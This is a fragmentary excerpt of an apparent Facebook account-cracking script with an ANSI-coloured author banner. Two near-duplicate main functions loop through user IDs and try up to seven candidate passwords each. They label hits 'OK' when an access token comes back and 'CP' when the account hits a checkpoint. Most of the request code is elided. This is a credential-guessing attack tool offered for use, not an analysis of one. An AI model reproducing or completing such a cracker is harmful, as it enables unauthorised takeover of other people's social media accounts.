...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;92m➣ \033[1;92mDEVOLPER   :            CYBER-AURELIO-007

     \033[1;91m➣ \033[1;92mFACEBOOK   :            AURELIO JOERLY 

     \033[1;93m➣ \033[1;92mTEAM GROUP   :            SILENT-FORCE 

     \033[1;96m➣ \033[1;92mGITHUB     :            AURELIO-AK47
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;31m [AURELIO-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;32m [AURELIO-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in q:
						...
						print(" \033[1;33m [AURELIO-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;34m [AURELIO-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;35m [AURELIO-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;36m [AURELIO-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in q:
										...
										print(" \033[1;31m [AURELIO-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;32m [AURELIO-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;33m [AURELIO-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;34m [AURELIO-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;35m [AURELIO-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;36m [AURELIO-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;31m [AURELIO-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;32m [AURELIO-CP] "+uid+" | "+pass7+"\033[0;97m")
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;32m [AURELIO-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;31m [AURELIO-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in q:
						...
						print(" \033[1;36m [AURELIO-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;35m [AURELIO-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;34m [AURELIO-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;33m [AURELIO-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in q:
										...
										print(" \033[1;32m [AURELIO-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;31m [AURELIO-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;36m [AURELIO-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;35m [AURELIO-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;34m [AURELIO-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;23m [AURELIO-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;32m [AURELIO-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;31m [AURELIO-CP] "+uid+" | "+pass7+"\033[0;97m")
